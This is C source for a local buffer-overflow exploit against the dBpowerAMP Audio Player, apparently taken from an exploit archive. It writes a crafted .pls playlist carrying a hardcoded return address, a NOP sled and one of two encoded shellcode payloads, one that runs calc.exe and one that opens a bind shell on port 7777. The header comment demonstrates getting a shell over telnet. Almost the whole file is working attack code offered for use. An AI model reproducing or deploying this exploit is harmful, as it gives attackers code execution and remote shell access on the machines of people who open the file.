/*
* simo36.c
* CODED By SimO-s0fT  (Morrocco-->marrakesh city)
* Home : Exploiter-ma.com
* e-mail: maroc-anti-connexion[at]hotmail.com[dot]com
*greetz : Stack & Djekmani4ever & alphanix & all friends
* dBpowerAMP Audio Player local buffer overflow exploit
*       
* this feat was exploit  windows trus sp2  
* there is a small problem on the farm but fortunately I managed to use it 
* and remember that this feat has been operating as trus win  
* I test and winxp sp1 I found another problem
* example:
            &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
            &&&&&  G:\Documents and Settings\SimO\Bureau>simo simo36.pls              &&&&&     
            &&&&&  ################################################################   &&&&&
            &&&&&  dBpowerAMP Audio Player local buffer overflow exploit              &&&&&
            &&&&&  Coded By SimO-s0fT                                                 &&&&&
            &&&&&  e-mail : simo[at]exploiter-ma[dot]com                              &&&&&
            &&&&&  ################################################################   &&&&&
            &&&&&  USAGE : simo36.exe simo.pls                                        &&&&&
            &&&&&  [1] execute calc.exe                                               &&&&&
            &&&&&  [2] execute bindshell LPORT=7777                                   &&&&&     
            &&&&&  ################################################################   &&&&&             
            &&&&&  enter 2                                                            &&&&&             
            &&&&&  created !!                                                         &&&&&
            &&&&&  openit with dBpowerAMP                                             &&&&&
            &&&&&                                                                     &&&&&             
            &&&&&  G:\Documents and Settings\SimO>telnet 127.0.0.1 7777               &&&&&             
            &&&&&  Microsoft Windows XP [version 5.1.2600]                            &&&&&                 
            &&&&&  Microso(C) Copyright 1985-2001 Microsoft Corp.                     &&&&&
            &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
*/

#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<windows.h>

#define OFFSET 257

char header[]=
            "\x5b\x70\x6c\x61\x79\x6c\x69\x73\x74\x5d\x0d\x0d\x4e\x75\x6d\x62"
            "\x65\x72\x4f\x66\x45\x6e\x74\x72\x69\x65\x73\x3d\x31\x0d\x0d\x46"
            "\x69\x6c\x65\x31\x3d\x68\x74\x74\x70\x3a\x2f\x2f";
// calc
char scode1[] =
            "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
            "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
            "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
            "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
            "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"
            "\x42\x30\x42\x50\x42\x30\x4b\x48\x45\x54\x4e\x43\x4b\x38\x4e\x47"
            "\x45\x50\x4a\x57\x41\x30\x4f\x4e\x4b\x58\x4f\x54\x4a\x41\x4b\x38"
            "\x4f\x45\x42\x42\x41\x50\x4b\x4e\x49\x44\x4b\x38\x46\x33\x4b\x48"
            "\x41\x50\x50\x4e\x41\x53\x42\x4c\x49\x59\x4e\x4a\x46\x58\x42\x4c"
            "\x46\x57\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
            "\x46\x4f\x4b\x53\x46\x55\x46\x32\x46\x50\x45\x47\x45\x4e\x4b\x58"
            "\x4f\x45\x46\x52\x41\x50\x4b\x4e\x48\x56\x4b\x58\x4e\x50\x4b\x44"
            "\x4b\x48\x4f\x55\x4e\x41\x41\x30\x4b\x4e\x4b\x58\x4e\x41\x4b\x38"
            "\x41\x50\x4b\x4e\x49\x48\x4e\x45\x46\x32\x46\x50\x43\x4c\x41\x33"
            "\x42\x4c\x46\x46\x4b\x38\x42\x44\x42\x53\x45\x38\x42\x4c\x4a\x47"
            "\x4e\x30\x4b\x48\x42\x44\x4e\x50\x4b\x58\x42\x37\x4e\x51\x4d\x4a"
            "\x4b\x48\x4a\x36\x4a\x30\x4b\x4e\x49\x50\x4b\x38\x42\x58\x42\x4b"
            "\x42\x50\x42\x50\x42\x50\x4b\x38\x4a\x36\x4e\x43\x4f\x45\x41\x53"
            "\x48\x4f\x42\x46\x48\x35\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x57"
            "\x42\x45\x4a\x36\x42\x4f\x4c\x38\x46\x30\x4f\x35\x4a\x46\x4a\x39"
            "\x50\x4f\x4c\x38\x50\x50\x47\x55\x4f\x4f\x47\x4e\x43\x46\x41\x46"
            "\x4e\x46\x43\x36\x42\x50\x5a\x2f";
// bind shell 7777            
char scode2[] =
           "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
           "\x49\x49\x49\x37\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x61"
           "\x58\x30\x42\x31\x50\x42\x41\x6b\x41\x41\x71\x32\x41\x42\x41\x32"
           "\x42\x41\x30\x42\x41\x58\x38\x41\x42\x50\x75\x6d\x39\x4b\x4c\x32"
           "\x4a\x5a\x4b\x50\x4d\x6d\x38\x6b\x49\x49\x6f\x59\x6f\x39\x6f\x35"
           "\x30\x6c\x4b\x70\x6c\x65\x74\x37\x54\x4c\x4b\x42\x65\x47\x4c\x6e"
           "\x6b\x31\x6c\x46\x65\x33\x48\x43\x31\x48\x6f\x6c\x4b\x70\x4f\x65"
           "\x48\x6c\x4b\x73\x6f\x35\x70\x37\x71\x38\x6b\x31\x59\x4c\x4b\x46"
           "\x54\x6e\x6b\x53\x31\x58\x6e\x30\x31\x6f\x30\x4f\x69\x4e\x4c\x4b"
           "\x34\x49\x50\x41\x64\x46\x67\x49\x51\x7a\x6a\x46\x6d\x43\x31\x48"
           "\x42\x5a\x4b\x38\x74\x47\x4b\x30\x54\x64\x64\x51\x38\x42\x55\x4b"
           "\x55\x4e\x6b\x53\x6f\x51\x34\x43\x31\x4a\x4b\x50\x66\x4e\x6b\x46"
           "\x6c\x42\x6b\x4c\x4b\x73\x6f\x75\x4c\x33\x31\x5a\x4b\x65\x53\x34"
           "\x6c\x6e\x6b\x6d\x59\x30\x6c\x57\x54\x55\x4c\x55\x31\x4b\x73\x74"
           "\x71\x69\x4b\x65\x34\x6e\x6b\x43\x73\x74\x70\x6c\x4b\x67\x30\x46"
           "\x6c\x6c\x4b\x70\x70\x67\x6c\x6e\x4d\x6c\x4b\x57\x30\x44\x48\x71"
           "\x4e\x72\x48\x4e\x6e\x50\x4e\x54\x4e\x38\x6c\x70\x50\x4b\x4f\x4e"
           "\x36\x71\x76\x41\x43\x31\x76\x31\x78\x76\x53\x30\x32\x53\x58\x30"
           "\x77\x44\x33\x57\x42\x63\x6f\x70\x54\x6b\x4f\x48\x50\x73\x58\x58"
           "\x4b\x58\x6d\x6b\x4c\x57\x4b\x70\x50\x6b\x4f\x6a\x76\x71\x4f\x6d"
           "\x59\x4b\x55\x65\x36\x6c\x41\x68\x6d\x53\x38\x63\x32\x42\x75\x51"
           "\x7a\x36\x62\x59\x6f\x58\x50\x71\x78\x4a\x79\x34\x49\x4b\x45\x6e"
           "\x4d\x30\x57\x69\x6f\x4e\x36\x52\x73\x41\x43\x62\x73\x76\x33\x51"
           "\x43\x70\x43\x43\x63\x73\x73\x36\x33\x6b\x4f\x4a\x70\x75\x36\x41"
           "\x78\x75\x4e\x71\x71\x35\x36\x42\x73\x4b\x39\x79\x71\x6c\x55\x70"
           "\x68\x4f\x54\x75\x4a\x32\x50\x39\x57\x52\x77\x69\x6f\x38\x56\x70"
           "\x6a\x72\x30\x50\x51\x53\x65\x4b\x4f\x58\x50\x55\x38\x6c\x64\x4c"
           "\x6d\x34\x6e\x49\x79\x66\x37\x6b\x4f\x4e\x36\x50\x53\x30\x55\x69"
           "\x6f\x4a\x70\x53\x58\x7a\x45\x41\x59\x4e\x66\x37\x39\x36\x37\x69"
           "\x6f\x59\x46\x72\x70\x50\x54\x31\x44\x33\x65\x4b\x4f\x5a\x70\x4f"
           "\x63\x51\x78\x38\x67\x50\x79\x38\x46\x43\x49\x32\x77\x4b\x4f\x4b"
           "\x66\x62\x75\x79\x6f\x6a\x70\x45\x36\x30\x6a\x52\x44\x30\x66\x41"
           "\x78\x32\x43\x72\x4d\x6f\x79\x6d\x35\x62\x4a\x42\x70\x70\x59\x74"
           "\x69\x5a\x6c\x6c\x49\x6b\x57\x41\x7a\x32\x64\x6b\x39\x68\x62\x30"
           "\x31\x6f\x30\x6b\x43\x6e\x4a\x6b\x4e\x51\x52\x34\x6d\x49\x6e\x62"
           "\x62\x36\x4c\x5a\x33\x6c\x4d\x71\x6a\x65\x68\x6e\x4b\x4c\x6b\x4e"
           "\x4b\x55\x38\x30\x72\x59\x6e\x4c\x73\x37\x66\x4b\x4f\x30\x75\x63"
           "\x74\x39\x6f\x6e\x36\x33\x6b\x36\x37\x72\x72\x31\x41\x31\x41\x46"
           "\x31\x50\x6a\x55\x51\x31\x41\x41\x41\x32\x75\x42\x71\x39\x6f\x48"
           "\x50\x50\x68\x6c\x6d\x39\x49\x45\x55\x78\x4e\x30\x53\x39\x6f\x6b"
           "\x66\x62\x4a\x79\x6f\x39\x6f\x47\x47\x39\x6f\x58\x50\x4e\x6b\x50"
           "\x57\x4b\x4c\x6c\x43\x4b\x74\x70\x64\x6b\x4f\x6a\x76\x41\x42\x49"
           "\x6f\x58\x50\x30\x68\x68\x6f\x6a\x6e\x4b\x50\x31\x70\x42\x73\x49"
           "\x6f\x58\x56\x49\x6f\x78\x50\x61";

int main(int argc,char *argv[]){
    FILE *openfile;
    unsigned char *buffer;
    unsigned int RET=0x7c85d568;
    unsigned int offset=0;
    int number=0;
    
    printf("################################################################\n");
    printf(" dBpowerAMP Audio Player local buffer overflow exploit\n");
    printf("\tCoded By SimO-s0fT\n");
    printf("e-mail : simo[at]exploiter-ma[dot]com\n");
    printf("################################################################\n");
    printf("USAGE : simo36.exe simo.pls\n");
    printf("[1] execute calc.exe\n");
    printf("[2] execute bindshell LPORT=7777\n");
    printf("################################################################\n");
    system("color 04");
    sleep(2000);
    printf("enter");
    scanf("%d",&number);
    if((openfile=fopen(argv[1],"wb"))==NULL){
                                             perror("cannot opening file xD");
                                             exit(0);
                                             }
    switch(number){
                   case 1:
                                       buffer = (unsigned char *) malloc (OFFSET + sizeof(RET) + strlen(scode1));
                                       memset(buffer,0x90,OFFSET + sizeof(RET) + strlen(scode1));
                                       offset=OFFSET;
                                       memcpy(buffer+offset,&RET,sizeof(RET)-1);
                                       offset+=sizeof(RET);
                                       memcpy(buffer+offset,scode1,strlen(scode1));
                                       offset+=strlen(scode1);
                                       fputs(header,openfile);
                                       fputs(buffer,openfile);
                                       fclose(openfile);
                                       printf("created !!\nopenit with dBpowerAMP");
                                       break;
                   
                   case 2: 
                                       buffer = (unsigned char *) malloc ( OFFSET + sizeof(RET) + strlen(scode2));
                                       memset(buffer,0x90, OFFSET + sizeof(RET) + strlen(scode2));
                                       offset=OFFSET;
                                       memcpy(buffer+offset,&RET,sizeof(RET));
                                       offset+=sizeof(RET);
                                       memcpy(buffer+offset,scode2,strlen(scode2));
                                       offset+=strlen(scode2);
                                       fputs(header,openfile);
                                       fputs(buffer,openfile);
                                       fclose(openfile);
                                       printf("created !!\n openit with dBpowerAMP");
                                       break;
                  }
    free(buffer);
    return 0;
}

